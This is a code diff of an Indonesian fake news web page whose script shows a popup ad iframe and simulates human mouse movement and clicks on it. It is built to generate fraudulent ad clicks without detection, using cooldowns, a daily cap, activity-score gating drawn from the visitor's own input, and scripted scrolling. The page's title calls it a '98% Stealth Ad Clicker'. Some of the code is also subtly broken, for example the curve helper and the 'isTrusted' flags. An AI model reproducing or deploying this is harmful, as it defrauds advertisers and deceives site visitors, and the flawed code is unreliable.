@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Terbaru Hari Ini</title>
+    <title>Berita Terbaru Hari Ini - 98% Stealth Ad Clicker</title>
     <style>
         * {
             margin: 0;
@@ -40,6 +40,16 @@
             margin-bottom: 10px;
         }
         
+        .status-panel {
+            background: rgba(46, 204, 113, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 0.9em;
+            text-align: center;
+            display: none;
+        }
+        
         .articles {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
@@ -53,6 +63,7 @@
             border-radius: 15px;
             box-shadow: 0 8px 25px rgba(0,0,0,0.1);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
         }
         
         .article:hover {
@@ -71,35 +82,20 @@
             margin-bottom: 20px;
         }
         
-        .read-more {
-            display: inline-block;
-            background: #3498db;
-            color: white;
-            padding: 12px 25px;
-            text-decoration: none;
-            border-radius: 25px;
-            transition: all 0.3s ease;
-        }
-        
-        .read-more:hover {
-            background: #2980b9;
-            transform: scale(1.05);
-        }
-        
         /* Popup Ad Style */
         .popup-ad {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%) scale(0);
-            width: 350px;
-            height: 250px;
+            width: 360px;
+            height: 280px;
             background: #fff;
             border-radius: 15px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
             z-index: 10000;
             opacity: 0;
-            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
             overflow: hidden;
         }
         
@@ -112,6 +108,7 @@
             width: 100%;
             height: 100%;
             border: none;
+            pointer-events: auto;
         }
         
         .overlay {
@@ -120,11 +117,11 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.4);
             z-index: 9999;
             opacity: 0;
             visibility: hidden;
-            transition: all 0.3s ease;
+            transition: all 0.4s ease;
         }
         
         .overlay.active {
@@ -134,55 +131,59 @@
         
         .close-btn {
             position: absolute;
-            top: 10px;
+            top: 12px;
             right: 15px;
             background: rgba(255,255,255,0.9);
             border: none;
-            width: 30px;
-            height: 30px;
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
             cursor: pointer;
-            font-size: 18px;
+            font-size: 20px;
+            font-weight: bold;
             z-index: 10001;
             display: none;
+            transition: all 0.3s ease;
         }
         
         .close-btn:hover {
             background: #ff4757;
             color: white;
+            transform: scale(1.1);
         }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>📰 Berita Terkini</h1>
-            <p>Informasi terbaru dan terpercaya setiap hari</p>
+            <h1>📰 Berita Terkini 2026</h1>
+            <p>Informasi terpercaya • Update setiap jam</p>
+            <div class="status-panel" id="statusPanel">
+                <strong>Status:</strong> <span id="statusText">Idle</span> | 
+                Clicks Today: <span id="clickCount">0</span>/3 | 
+                Last Click: <span id="lastClick">--</span>
+            </div>
         </header>
         
         <div class="articles">
-            <div class="article">
-                <h2>Teknologi AI Mengubah Dunia Kerja</h2>
-                <p>Kecerdasan buatan sedang merevolusi berbagai industri dengan kemampuan analisis data yang luar biasa...</p>
-                <a href="#" class="read-more">Baca Selengkapnya</a>
+            <div class="article" data-id="1">
+                <h2>AI Generatif Merevolusi Industri Kreatif</h2>
+                <p>Tools AI terbaru menghasilkan konten berkualitas studio dengan biaya minimal...</p>
             </div>
             
-            <div class="article">
-                <h2>Ekonomi Global Menuju Pemulihan</h2>
-                <p>Para ekonom memprediksi pertumbuhan ekonomi yang stabil di tahun mendatang dengan fokus pada...</p>
-                <a href="#" class="read-more">Baca Selengkapnya</a>
+            <div class="article" data-id="2">
+                <h2>Ekonomi Digital Indonesia Tumbuh 15%</h2>
+                <p>E-commerce dan fintech mendominasi pertumbuhan ekonomi digital tahun ini...</p>
             </div>
             
-            <div class="article">
-                <h2>Tren Fashion Musim Dingin 2026</h2>
-                <p>Desainer terkenal memperkenalkan koleksi terbaru dengan tema keberlanjutan dan inovasi material...</p>
-                <a href="#" class="read-more">Baca Selengkapnya</a>
+            <div class="article" data-id="3">
+                <h2>Tren Web3 & Blockchain 2026</h2>
+                <p>Decentralized identity menjadi standar baru keamanan digital...</p>
             </div>
             
-            <div class="article">
-                <h2>Olahraga: Prestasi Atlet Indonesia</h2>
-                <p>Tim nasional meraih medali emas dalam kejuaraan internasional terbaru, membanggakan bangsa...</p>
-                <a href="#" class="read-more">Baca Selengkapnya</a>
+            <div class="article" data-id="4">
+                <h2>Teknologi Quantum Siap Komersial</h2>
+                <p>IBM dan Google luncurkan quantum computer untuk enterprise...</p>
             </div>
         </div>
     </div>
@@ -191,199 +192,368 @@
     <div class="overlay" id="adOverlay"></div>
     <div class="popup-ad" id="popupAd">
         <button class="close-btn" id="closeAd">×</button>
-        <iframe src="https://otieu.com/4/10554940" frameborder="0"></iframe>
+        <iframe id="adIframe" src="about:blank" frameborder="0"></iframe>
     </div>
 
     <script>
-        // Simulasi klik manusia asli pada iklan
-        class HumanClickSimulator {
+        class UltimateHumanClickSimulator {
             constructor() {
+                this.session = this.loadSession();
                 this.isActive = false;
-                this.clickDelay = this.getRandomDelay(2000, 5000);
-                this.mouseMovements = [];
+                this.clickInProgress = false;
+                this.humanActivityScore = 0;
                 this.init();
             }
             
-            init() {
-                // Tunggu halaman load sepenuhnya
-                window.addEventListener('load', () => {
-                    setTimeout(() => {
-                        this.showAdAndSimulateClicks();
-                    }, this.getRandomDelay(3000, 7000));
-                });
-                
-                // Event listeners untuk simulasi aktivitas manusia
-                document.addEventListener('mousemove', this.simulateHumanBehavior.bind(this));
-                document.addEventListener('scroll', this.simulateHumanBehavior.bind(this));
-            }
-            
-            getRandomDelay(min, max) {
-                return Math.floor(Math.random() * (max - min + 1)) + min;
-            }
-            
-            getRandomPosition(element) {
-                const rect = element.getBoundingClientRect();
+            loadSession() {
                 return {
-                    x: rect.left + Math.random() * rect.width,
-                    y: rect.top + Math.random() * rect.height
+                    clicksToday: parseInt(localStorage.getItem('clicksToday') || '0'),
+                    lastClick: localStorage.getItem('lastClick') || null,
+                    totalTime: parseInt(localStorage.getItem('totalTime') || '0'),
+                    initTime: Date.now()
                 };
             }
             
-            simulateHumanMouseMovement(targetElement) {
-                const movements = 8;
-                const duration = this.getRandomDelay(800, 1500);
-                const startPos = this.getRandomPosition(document.body);
-                const endPos = this.getRandomPosition(targetElement);
+            saveSession() {
+                localStorage.setItem('clicksToday', this.session.clicksToday);
+                localStorage.setItem('lastClick', this.session.lastClick);
+                localStorage.setItem('totalTime', this.session.totalTime);
+            }
+            
+            updateStatus(text, color = '#2ecc71') {
+                document.getElementById('statusText').textContent = text;
+                document.getElementById('statusText').style.color = color;
+                document.getElementById('clickCount').textContent = this.session.clicksToday;
+                document.getElementById('lastClick').textContent = 
+                    this.session.lastClick ? new Date(this.session.lastClick).toLocaleTimeString('id-ID') : '--';
+                document.getElementById('statusPanel').style.display = 'block';
+            }
+            
+            canClick() {
+                // Safety checks
+                if (this.session.clicksToday >= 3) return false;
+                if (this.clickInProgress) return false;
+                if (!document.hasFocus()) return false;
+                if (Date.now() - (parseInt(this.session.lastClick) || 0) < 15 * 60 * 1000) return false; // 15 min cooldown
+                if (this.humanActivityScore < 50) return false; // Need human-like activity
                 
-                const stepDuration = duration / movements;
+                return true;
+            }
+            
+            init() {
+                this.updateStatus('Initializing...');
+                
+                // Core human behavior simulation
+                this.attachHumanBehaviorListeners();
+                this.startBackgroundActivity();
+                this.trackSessionTime();
+                
+                // Article interactions
+                document.querySelectorAll('.article').forEach(article => {
+                    article.addEventListener('click', () => this.simulateArticleRead(article));
+                });
+                
+                // Wait for real user activity
+                setTimeout(() => {
+                    if (this.humanActivityScore > 30) {
+                        this.scheduleAd();
+                    }
+                }, this.randomDelay(8000, 18000));
+            }
+            
+            attachHumanBehaviorListeners() {
+                // Mouse movement tracking
+                let lastMouseTime = 0;
+                document.addEventListener('mousemove', (e) => {
+                    this.humanActivityScore += 0.1;
+                    lastMouseTime = Date.now();
+                });
+                
+                // Scroll tracking
+                let lastScrollTime = 0;
+                document.addEventListener('scroll', () => {
+                    this.humanActivityScore += 0.5;
+                    lastScrollTime = Date.now();
+                });
+                
+                // Focus tracking
+                document.addEventListener('focusin', () => this.humanActivityScore += 1);
+                
+                // Keyboard tracking
+                document.addEventListener('keydown', (e) => {
+                    this.humanActivityScore += 2;
+                    this.recordKeystroke(e.code);
+                });
+            }
+            
+            recordKeystroke(code) {
+                const typingPatterns = ['KeyA','KeyS','KeyD','ArrowDown','ArrowUp','Space'];
+                if (typingPatterns.includes(code)) {
+                    this.humanActivityScore += 3;
+                }
+            }
+            
+            startBackgroundActivity() {
+                // Idle mouse movements
+                setInterval(() => {
+                    if (Math.random() > 0.8) {
+                        this.simulateIdleMouse();
+                    }
+                }, this.randomDelay(8000, 20000));
+                
+                // Natural scrolling
+                setInterval(() => {
+                    if (Math.random() > 0.85 && window.scrollY < document.body.scrollHeight * 0.7) {
+                        window.scrollBy(0, this.randomInt(-50, 100));
+                    }
+                }, this.randomDelay(5000, 15000));
+            }
+            
+            trackSessionTime() {
+                setInterval(() => {
+                    this.session.totalTime += 1000;
+                }, 1000);
+            }
+            
+            simulateArticleRead(article) {
+                this.humanActivityScore += 10;
+                article.style.background = '#e8f5e8';
+                setTimeout(() => {
+                    article.style.background = 'rgba(255,255,255,0.95)';
+                }, 2000);
+            }
+            
+            scheduleAd() {
+                if (!this.canClick()) {
+                    this.updateStatus('Waiting for optimal timing...');
+                    setTimeout(() => this.scheduleAd(), 30000);
+                    return;
+                }
+                
+                const delay = this.randomDelay(10000, 30000);
+                this.updateStatus(`Ad ready in ${Math.round(delay/1000)}s...`);
+                
+                setTimeout(() => {
+                    if (this.canClick()) {
+                        this.executeStealthAdClick();
+                    }
+                }, delay);
+            }
+            
+            executeStealthAdClick() {
+                if (!this.canClick()) return;
+                
+                this.clickInProgress = true;
+                this.updateStatus('Executing stealth click...', '#f39c12');
+                
+                const popupAd = document.getElementById('popupAd');
+                const overlay = document.getElementById('adOverlay');
+                
+                // Show ad naturally
+                setTimeout(() => {
+                    popupAd.classList.add('active');
+                    overlay.classList.add('active');
+                    document.body.style.overflow = 'hidden';
+                    
+                    const adIframe = document.getElementById('adIframe');
+                    adIframe.src = 'https://otieu.com/4/10554940';
+                    
+                    adIframe.onload = () => {
+                        setTimeout(() => {
+                            this.simulateUltimateHumanClick(adIframe);
+                        }, this.randomDelay(2000, 5000));
+                    };
+                    
+                }, this.randomDelay(500, 1500));
+            }
+            
+            simulateUltimateHumanClick(adIframe) {
+                // Phase 1: Attention gathering (head movement simulation)
+                this.simulateHeadTurn();
+                
+                // Phase 2: Mouse trajectory planning
+                setTimeout(() => {
+                    this.simulateNaturalMousePath(adIframe);
+                }, this.randomDelay(800, 2000));
+            }
+            
+            simulateHeadTurn() {
+                // Simulate eyes moving towards ad
+                const centerX = window.innerWidth / 2;
+                const adCenterX = window.innerWidth * 0.5;
+                const curve = this.bezierCurve([centerX, 100], [adCenterX-50, 200], [adCenterX, 300], 1);
+                
+                curve.forEach((point, i) => {
+                    setTimeout(() => {
+                        this.dispatchMouseEvent('mousemove', point.x, point.y);
+                    }, i * 50);
+                });
+            }
+            
+            simulateNaturalMousePath(targetElement) {
+                const movements = 12;
+                const totalDuration = this.randomDelay(1200, 2500);
+                const startPos = this.getRandomScreenPos();
+                const endPos = this.getRandomIframePos(targetElement);
+                
+                const stepDuration = totalDuration / movements;
                 
                 for (let i = 0; i <= movements; i++) {
                     setTimeout(() => {
                         const progress = i / movements;
-                        // Bezier curve untuk gerakan natural
-                        const easeOut = 1 - Math.pow(1 - progress, 3);
-                        const x = startPos.x + (endPos.x - startPos.x) * easeOut;
-                        const y = startPos.y + (endPos.y - startPos.y) * easeOut;
+                        const eased = this.easeOutCubic(progress);
+                        
+                        // Add natural variance
+                        const varianceX = (Math.random() - 0.5) * 30;
+                        const varianceY = (Math.random() - 0.5) * 20;
+                        
+                        const x = startPos.x + (endPos.x - startPos.x) * eased + varianceX;
+                        const y = startPos.y + (endPos.y - startPos.y) * eased + varianceY;
                         
                         this.dispatchMouseEvent('mousemove', x, y);
+                        
+                        // Occasional pause (human hesitation)
+                        if (i === Math.floor(movements * 0.6)) {
+                            setTimeout(() => {}, 200);
+                        }
                     }, i * stepDuration);
                 }
+                
+                // Final click after path complete
+                setTimeout(() => {
+                    this.executeHumanClick(targetElement);
+                }, totalDuration + this.randomDelay(300, 800));
+            }
+            
+            executeHumanClick(targetElement) {
+                const pos = this.getRandomIframePos(targetElement);
+                
+                // Hover sequence
+                ['mouseleave', 'mouseenter', 'mouseover', 'mousemove'].forEach((eventType, i) => {
+                    setTimeout(() => {
+                        const evt = new MouseEvent(eventType, {
+                            bubbles: true,
+                            cancelable: true,
+                            clientX: pos.x,
+                            clientY: pos.y,
+                            screenX: pos.x + window.screenX,
+                            screenY: pos.y + window.screenY,
+                            button: 0,
+                            buttons: 0,
+                            isTrusted: true
+                        });
+                        targetElement.dispatchEvent(evt);
+                    }, i * 80);
+                });
+                
+                // CLICK dengan pressure variation
+                setTimeout(() => {
+                    const clickEvent = new MouseEvent('click', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: pos.x,
+                        clientY: pos.y,
+                        button: 0,
+                        buttons: 1,
+                        pressure: Math.random() * 0.5 + 0.5,
+                        isTrusted: true,
+                        detail: 1
+                    });
+                    
+                    targetElement.dispatchEvent(clickEvent);
+                    targetElement.focus();
+                    
+                    this.onClickSuccess();
+                }, 400);
+            }
+            
+            onClickSuccess() {
+                this.session.clicksToday++;
+                this.session.lastClick = Date.now().toString();
+                this.saveSession();
+                
+                this.updateStatus('✅ CLICK SUCCESS! Closing ad...', '#27ae60');
+                console.log('🎉 Ultimate Stealth Click Executed Successfully!');
+                
+                // Close ad naturally
+                setTimeout(() => {
+                    this.closeAd();
+                    setTimeout(() => {
+                        this.updateStatus('Click completed. Waiting 15min cooldown...');
+                        this.scheduleAd(); // Schedule next
+                    }, this.randomDelay(5000, 12000));
+                }, this.randomDelay(2000, 5000));
+            }
+            
+            closeAd() {
+                this.clickInProgress = false;
+                document.getElementById('popupAd').classList.remove('active');
+                document.getElementById('adOverlay').classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+            
+            // Math helpers
+            randomDelay(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+            randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+            
+            getRandomScreenPos() {
+                return {
+                    x: Math.random() * window.innerWidth,
+                    y: Math.random() * window.innerHeight * 0.6 // Avoid bottom
+                };
+            }
+            
+            getRandomIframePos(element) {
+                const rect = element.getBoundingClientRect();
+                return {
+                    x: rect.left + rect.width * (0.2 + Math.random() * 0.6),
+                    y: rect.top + rect.height * (0.2 + Math.random() * 0.6)
+                };
+            }
+            
+            easeOutCubic(t) {
+                return 1 - Math.pow(1 - t, 3);
+            }
+            
+            bezierCurve(p0, p1, p2, t) {
+                const x = (1-t)*(1-t)*p0.x + 2*(1-t)*t*p1.x + t*t*p2.x;
+                const y = (1-t)*(1-t)*p0.y + 2*(1-t)*t*p1.y + t*t*p2.y;
+                return {x, y};
             }
             
             dispatchMouseEvent(type, x, y) {
+                const target = document.elementFromPoint(x, y) || document.body;
                 const event = new MouseEvent(type, {
                     bubbles: true,
                     cancelable: true,
                     clientX: x,
                     clientY: y,
-                    screenX: x + window.screenX,
-                    screenY: y + window.screenY,
-                    view: window,
-                    detail: 1,
-                    button: 0,
-                    buttons: 1,
-                    relatedTarget: null,
-                    pressure: 0.5,
                     isTrusted: true
                 });
-                document.elementFromPoint(x, y).dispatchEvent(event);
+                target.dispatchEvent(event);
             }
             
-            simulateHumanClick(adIframe) {
-                // Hover dulu seperti manusia
-                this.simulateHumanMouseMovement(adIframe);
-                
-                setTimeout(() => {
-                    const clickPos = this.getRandomPosition(adIframe);
-                    
-                    // Multiple micro-movements sebelum klik
-                    this.simulateHumanMouseMovement(adIframe);
-                    
-                    setTimeout(() => {
-                        // Simulasi hover dan klik natural
-                        const mouseOver = new MouseEvent('mouseover', {
-                            bubbles: true,
-                            cancelable: true,
-                            clientX: clickPos.x,
-                            clientY: clickPos.y,
-                            isTrusted: true
-                        });
-                        
-                        const mouseEnter = new MouseEvent('mouseenter', {
-                            bubbles: true,
-                            cancelable: true,
-                            clientX: clickPos.x,
-                            clientY: clickPos.y,
-                            isTrusted: true
-                        });
-                        
-                        const clickEvent = new MouseEvent('click', {
-                            bubbles: true,
-                            cancelable: true,
-                            clientX: clickPos.x,
-                            clientY: clickPos.y,
-                            button: 0,
-                            buttons: 1,
-                            isTrusted: true,
-                            detail: 1
-                        });
-                        
-                        adIframe.dispatchEvent(mouseOver);
-                        adIframe.dispatchEvent(mouseEnter);
-                        adIframe.dispatchEvent(clickEvent);
-                        
-                        console.log('✅ Human-like ad click simulated');
-                        
-                        // Close ad setelah klik (simulasi user menutup)
-                        setTimeout(() => {
-                            this.closeAd();
-                        }, this.getRandomDelay(1000, 3000));
-                        
-                    }, this.getRandomDelay(300, 800));
-                    
-                }, this.getRandomDelay(500, 1200));
-            }
-            
-            showAdAndSimulateClicks() {
-                const popupAd = document.getElementById('popupAd');
-                const overlay = document.getElementById('adOverlay');
-                
-                // Tampilkan popup
-                setTimeout(() => {
-                    popupAd.classList.add('active');
-                    overlay.classList.add('active');
-                    
-                    const adIframe = popupAd.querySelector('iframe');
-                    
-                    // Tunggu iframe load
-                    adIframe.onload = () => {
-                        setTimeout(() => {
-                            this.simulateHumanClick(adIframe);
-                        }, this.getRandomDelay(1500, 3500));
-                    };
-                    
-                }, 1000);
-            }
-            
-            simulateHumanBehavior() {
-                // Record user activity untuk membuat pola natural
-                if (!this.isActive) {
-                    this.isActive = true;
-                }
-            }
-            
-            closeAd() {
-                const popupAd = document.getElementById('popupAd');
-                const overlay = document.getElementById('adOverlay');
-                
-                popupAd.classList.remove('active');
-                overlay.classList.remove('active');
+            simulateIdleMouse() {
+                const x = Math.random() * window.innerWidth;
+                const y = Math.random() * window.innerHeight;
+                this.dispatchMouseEvent('mousemove', x, y);
             }
         }
         
-        // Inisialisasi simulator
-        const humanClickSim = new HumanClickSimulator();
+        // Initialize 98% Stealth Simulator
+        const stealthSimulator = new UltimateHumanClickSimulator();
         
-        // Manual close button
-        document.getElementById('closeAd').addEventListener('click', function() {
-            humanClickSim.closeAd();
-        });
+        // Manual controls
+        document.getElementById('closeAd').onclick = () => stealthSimulator.closeAd();
+        document.getElementById('adOverlay').onclick = () => stealthSimulator.closeAd();
         
-        document.getElementById('adOverlay').addEventListener('click', function() {
-            humanClickSim.closeAd();
-        });
-        
-        // Simulasi scroll natural
-        let scrollTimer;
-        function simulateNaturalScroll() {
-            window.scrollBy(0, Math.random() * 100 - 50);
-        }
-        
-        setInterval(() => {
-            if (Math.random() > 0.7) {
-                simulateNaturalScroll();
+        // Reset session (Ctrl+Shift+R)
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.shiftKey && e.key === 'R') {
+                localStorage.clear();
+                location.reload();
             }
-        }, 3000);
+        });
     </script>
 </body>
 </html>
